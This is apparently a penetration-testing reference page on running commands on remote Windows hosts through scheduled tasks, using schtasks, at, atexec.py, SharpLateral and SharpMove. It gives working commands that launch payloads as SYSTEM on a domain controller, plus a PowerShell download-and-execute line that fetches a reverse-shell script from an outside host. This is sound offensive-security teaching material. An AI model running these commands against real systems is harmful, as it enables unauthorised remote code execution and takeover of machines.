# AtExec / SchtasksExec

{{#include ../../banners/hacktricks-training.md}}

## How it works

With administrative access to a Windows host, an operator can create and start a scheduled task remotely. The `/S` option selects the remote host, `/U` and `/P` supply credentials for creating the task when needed, and `/RU` selects the account under which the task runs. The command referenced by `/TR` must exist on the remote system.<sup>[[1]](#references)</sup>

The older `at` command can also schedule a command on a remote host when the Schedule service is running. It executes scheduled jobs under the service account, which is commonly `SYSTEM`:<sup>[[5]](#references)</sup>

```cmd
at \\victim 23:00 shutdown -r
```

Create the task and then start it:

```bash
schtasks /create /S <VICTIM> /TN <TASK_NAME> /TR C:\path\executable.exe /SC ONCE /ST 23:00 /RU SYSTEM
schtasks /run /S <VICTIM> /TN <TASK_NAME>
```

For example:

```bash
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```

For a recurring weekly task, use a valid weekly schedule and specify the day explicitly:

```cmd
schtasks /create /S dcorp-dc.domain.local /SC WEEKLY /D MON /ST 23:00 /RU SYSTEM /TN MyWeeklyTask /TR C:\Windows\Temp\payload.exe
schtasks /run /S dcorp-dc.domain.local /TN MyWeeklyTask
```

A task action can also invoke PowerShell directly. The following lab example downloads and runs a script; host the payload only on infrastructure authorized for the assessment:

```cmd
schtasks /create /S dcorp-dc.domain.local /SC ONCE /ST 23:00 /RU SYSTEM /TN MyNewTask /TR "powershell.exe -NoProfile -Command \"IEX (New-Object Net.WebClient).DownloadString('http://192.0.2.10/InvokePowerShellTcp.ps1')\""
schtasks /run /S dcorp-dc.domain.local /TN MyNewTask
```

Impacket's `atexec.py` automates remote command execution through the Task Scheduler service and accepts password, NTLM-hash, or Kerberos authentication.<sup>[[2]](#references)</sup>

```bash
atexec.py 'DOMAIN'/'USER':'PASSWORD'@'target_ip' whoami
```

SharpLateral provides a scheduled-task execution method:<sup>[[3]](#references)</sup>

```bash
SharpLateral schedule HOSTNAME C:\Users\Administrator\Desktop\malware.exe TaskName
```

SharpMove provides another Task Scheduler implementation:<sup>[[4]](#references)</sup>

```bash
SharpMove.exe action=taskscheduler computername=remote.host.local command="C:\windows\temp\payload.exe" taskname=Debug amsi=true username=domain\\user password=password
```

More information about the [**use of schtasks with silver tickets here**](../active-directory-methodology/silver-ticket.md#host).

Remove testing tasks after use:

```bash
schtasks /delete /S <VICTIM> /TN <TASK_NAME> /F
```

## References

- [1] [Microsoft Learn - schtasks create](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/schtasks-create)
- [2] [Fortra Impacket - atexec.py](https://github.com/fortra/impacket/blob/master/examples/atexec.py)
- [3] [SharpLateral](https://github.com/mertdas/SharpLateral)
- [4] [SharpMove](https://github.com/0xthirteen/SharpMove)
- [5] [Microsoft Learn - `at` command](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/at)

{{#include ../../banners/hacktricks-training.md}}
